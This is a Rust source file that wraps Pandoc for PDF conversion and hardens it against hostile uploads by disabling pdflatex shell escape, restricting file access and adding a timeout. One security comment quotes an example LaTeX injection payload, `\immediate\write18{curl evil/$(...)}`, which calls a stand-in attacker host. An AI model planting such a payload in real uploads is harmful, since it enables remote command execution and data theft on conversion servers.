// Pandoc utility for runtime usage

use crate::common::AppError;
use std::path::PathBuf;
use std::process::Command;
use std::time::Duration;

/// Wall-clock timeout for the pandoc subprocess. Closes 05-file F-09
/// (Medium): without this, a hostile input that triggers a pdflatex
/// rendering loop (or just an oversized doc) would hang the request
/// forever, holding a tokio task slot and a Pandoc/pdflatex process.
/// 60s is generous for legitimate documents (most finish in <2s).
const PANDOC_TIMEOUT: Duration = Duration::from_secs(60);

/// Find Pandoc binary path
pub fn find_pandoc() -> Result<PathBuf, AppError> {
    // Try embedded binary first (extracted to app_data_dir/bin/)
    match super::embedded::get_pandoc_path() {
        Ok(path) => {
            tracing::debug!("Using embedded Pandoc at {:?}", path);
            return Ok(path.clone());
        }
        Err(e) => {
            tracing::warn!("Failed to get embedded Pandoc: {}, trying system", e);
        }
    }

    // Fall back to system pandoc
    match which::which("pandoc") {
        Ok(path) => {
            tracing::debug!("Found system Pandoc at {:?}", path);
            Ok(path)
        }
        Err(_) => Err(AppError::internal_error(
            "Pandoc not found. Embedded binary failed to extract and system pandoc not installed.",
        )),
    }
}

/// Convert document to PDF using Pandoc
pub async fn convert_to_pdf(
    input_path: &PathBuf,
    output_path: &PathBuf,
) -> Result<(), AppError> {
    let pandoc_path = find_pandoc()?;

    // SECURITY: pdflatex defaults (in texlive-full) honor `\write18{cmd}`
    // and `\immediate\write18{cmd}` macros to run arbitrary shell commands
    // as the server uid. A hostile DOCX / PPTX / RTF / ODT upload could
    // embed `\immediate\write18{curl evil/$(...)}` and Pandoc would route
    // it through pdflatex unchanged. Closes 05-file F-01 (Critical).
    //
    // The fix passes `-no-shell-escape` as a pdflatex option via
    // Pandoc's `--pdf-engine-opt`, which Pandoc forwards verbatim to the
    // engine. We also set `openout_any=p` so pdflatex can only write
    // into paths underneath the current working directory (which is the
    // server's temp dir for this conversion).
    // SECURITY: wall-clock timeout via tokio::time::timeout around
    // spawn_blocking. The Command's child is killed via Drop on the
    // JoinHandle when the timeout fires. Closes 05-file F-09 (Medium).
    let pandoc_path = pandoc_path.clone();
    let input_path = input_path.clone();
    let output_path = output_path.clone();

    let result = tokio::time::timeout(
        PANDOC_TIMEOUT,
        tokio::task::spawn_blocking(move || {
            Command::new(&pandoc_path)
                .arg(&input_path)
                .arg("-o")
                .arg(&output_path)
                .arg("--pdf-engine=pdflatex")
                .arg("--pdf-engine-opt=-no-shell-escape")
                .arg("--pdf-engine-opt=-interaction=nonstopmode")
                .env("openout_any", "p")
                .env("openin_any", "p")
                .output()
        }),
    )
    .await;

    let output = match result {
        Err(_) => {
            return Err(AppError::internal_error(
                "Pandoc conversion timed out after 60 seconds",
            ));
        }
        Ok(Err(e)) => {
            return Err(AppError::internal_error(format!(
                "Pandoc task panicked: {}",
                e
            )));
        }
        Ok(Ok(Err(e))) => {
            return Err(AppError::internal_error(format!(
                "Failed to run Pandoc: {}",
                e
            )));
        }
        Ok(Ok(Ok(output))) => output,
    };

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        return Err(AppError::internal_error(format!(
            "Pandoc PDF conversion failed: {}",
            stderr
        )));
    }

    Ok(())
}
